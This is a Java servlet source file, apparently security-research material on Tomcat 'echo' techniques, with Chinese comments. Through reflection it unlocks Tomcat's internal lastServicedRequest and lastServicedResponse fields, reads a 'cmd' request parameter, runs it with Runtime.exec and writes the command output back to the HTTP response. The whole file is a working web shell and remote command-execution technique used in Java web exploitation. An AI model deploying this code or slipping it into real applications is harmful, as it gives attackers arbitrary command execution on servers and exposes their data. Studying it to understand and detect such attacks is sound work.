package Echo;

import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@WebServlet("/echo")
public class Tomcat_Echo extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {

            //反射获取所需属性
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //使用modifiersField反射修改final型变量
            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量
            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){
                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
            }

            if (lastServicedRequestField.get(null)==null){
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }

            if (lastServicedResponseField.get(null)==null){
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }

            String cmd = null;
            //获取request变量
            if(lastServicedRequestField.get(null)!=null){
                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
//                System.out.println(servletRequest);
//                System.out.println((HttpServletRequest) servletRequest == req);
                cmd = servletRequest.getParameter("cmd");
            }

            //获取request变量
            if(lastServicedResponseField.get(null)!=null){
                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);
                ServletResponse servletResponse = (ServletResponse) threadLocal.get();

                PrintWriter writer = servletResponse.getWriter();

                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
                String result = scanner.hasNext()? scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();

            }


        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
